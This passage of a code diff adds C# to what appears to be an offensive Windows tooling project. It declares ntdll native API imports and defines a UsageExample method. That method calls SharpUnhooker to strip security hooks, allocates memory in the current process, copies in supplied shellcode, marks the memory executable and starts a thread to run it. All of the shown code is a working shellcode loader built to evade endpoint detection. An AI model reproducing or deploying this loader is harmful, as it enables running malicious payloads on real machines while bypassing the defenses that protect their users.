+        WINSTA_ENUMERATE = 0x00000100,
+        WINSTA_READSCREEN = 0x00000200,
+        WINSTA_ALL_ACCESS = 0x0000037F,
+
+        SECTION_ALL_ACCESS = 0x10000000,
+        SECTION_QUERY = 0x0001,
+        SECTION_MAP_WRITE = 0x0002,
+        SECTION_MAP_READ = 0x0004,
+        SECTION_MAP_EXECUTE = 0x0008,
+        SECTION_EXTEND_SIZE = 0x0010
+    };
+
+    [DllImport("ntdll.dll", SetLastError=true)]
+    static extern Dynavoke.NTSTATUS NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect);
+
+    [DllImport("ntdll.dll", SetLastError=true)]
+    static extern Dynavoke.NTSTATUS NtCreateThreadEx(out IntPtr threadHandle, ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, Int32 stackZeroBits, Int32 sizeOfStack, Int32 maximumStackSize, IntPtr attributeList);
+
+    [DllImport("ntdll.dll", SetLastError=true)]
+    static extern Dynavoke.NTSTATUS NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewAccessProtection, ref UInt32 OldAccessProtection);
+
+    public static void UsageExample(byte[] ShellcodeBytes) {
+        SharpUnhooker.Main();
+        IntPtr ProcessHandle = new IntPtr(-1); // pseudo-handle for current process
+        IntPtr ShellcodeBytesLength = new IntPtr(ShellcodeBytes.Length);
+        IntPtr AllocationAddress = new IntPtr();
+        IntPtr ZeroBitsThatZero = IntPtr.Zero;
+        UInt32 AllocationTypeUsed = (UInt32)AllocationType.Commit | (UInt32)AllocationType.Reserve;
+        Console.WriteLine("[*] Allocating memory...");
+        NtAllocateVirtualMemory(ProcessHandle, ref AllocationAddress, ZeroBitsThatZero, ref ShellcodeBytesLength, AllocationTypeUsed, 0x04);
+        Console.WriteLine("[*] Copying Shellcode...");
+        Marshal.Copy(ShellcodeBytes, 0, AllocationAddress, ShellcodeBytes.Length);
+        Console.WriteLine("[*] Changing memory protection setting...");
+        UInt32 newProtect = 0;
+        NtProtectVirtualMemory(ProcessHandle, ref AllocationAddress, ref ShellcodeBytesLength, 0x20, ref newProtect);
+        IntPtr threadHandle = new IntPtr(0);
+        ACCESS_MASK desiredAccess = ACCESS_MASK.SPECIFIC_RIGHTS_ALL | ACCESS_MASK.STANDARD_RIGHTS_ALL; // logical OR the access rights together
+        IntPtr pObjectAttributes = new IntPtr(0);
+        IntPtr lpParameter = new IntPtr(0);
+        bool bCreateSuspended = false;
+        int stackZeroBits = 0;
+        int sizeOfStackCommit = 0xFFFF;
+        int sizeOfStackReserve = 0xFFFF;
+        IntPtr pBytesBuffer = new IntPtr(0);
+        // create new thread
+        Console.WriteLine("[*] Creating new thread to execute the Shellcode...");
+        NtCreateThreadEx(out threadHandle, desiredAccess, pObjectAttributes, ProcessHandle, AllocationAddress, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);
+        Console.WriteLine("[+] Thread created with handle {0}! Sh3llc0d3 executed!", threadHandle.ToString("X4"));
     }
 }
